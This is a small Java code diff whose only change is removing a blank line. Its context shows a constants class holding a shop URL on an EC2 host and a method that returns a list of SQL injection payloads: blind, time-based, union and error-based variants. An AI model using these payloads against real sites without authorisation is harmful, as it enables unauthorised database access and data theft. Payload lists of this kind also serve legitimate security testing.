@@ -18,7 +18,6 @@ public class Const {
     public final static String PAWFIT_COLLAR_URL="http://ec2-3-9-114-57.eu-west-2.compute.amazonaws.com/shop/product/Pawfit%20Collar.html";
     public final static String[] getSQlText(){
         String[] strings={"and ascii(substr((select database()),1,1))>64", "id=1 union select if(SUBSTRING(user(),1,4)='root',sleep(4),1),null,null", "id =-1 union select 1,2,3", "id=1' substr(database(),1,1)='t'--+", "union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a", "id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))"};
-
         return strings;
 
     }
